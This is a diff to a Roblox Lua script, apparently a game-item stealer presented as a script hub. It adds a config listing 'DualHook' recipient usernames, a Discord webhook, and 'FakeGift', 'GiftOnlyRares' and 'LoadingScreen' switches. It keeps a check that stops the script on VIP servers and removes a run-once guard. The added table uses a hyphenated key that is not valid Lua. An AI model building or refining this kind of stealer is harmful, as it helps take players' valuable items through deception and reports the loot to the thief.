@@ -10,7 +10,17 @@
                         Made by: Scripter.SM
                         Discord: discord.gg/d2zgg2YDMz
 ]]
-
+_G.Script.SM.Config = {
+    DualHook-User = {"User1", "User2", "User3", "User4"},
+    pingEveryone = "No", -- dont change this
+    Webhook = "dumb",
+    FakeGift = "No",
+    Trash = "dumb",
+    LoadingScreen = "No",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "No",
+}
+    
 getgenv().Webhook = "PUT_HERE_UR_WEBHOOK"
 getgenv().Username = "PUT_HERE_UR_USERNAME"
         local RS = game:GetService("ReplicatedStorage")
@@ -73,12 +83,6 @@ getgenv().Username = "PUT_HERE_UR_USERNAME"
         if GetServerType:InvokeServer() == "VIPServer" then
             error("Script stopped - VIP Server detected")        
         end
-
-        if getgenv().EclipseHubRunning then
-            warn("Script is already running or has been executed! Cannot run again.")
-            return
-        end
-        getgenv().EclipseHubRunning = true
 
         -- Updated PetPriorityData with isMutation field and additional pets
         local PetPriorityData = {
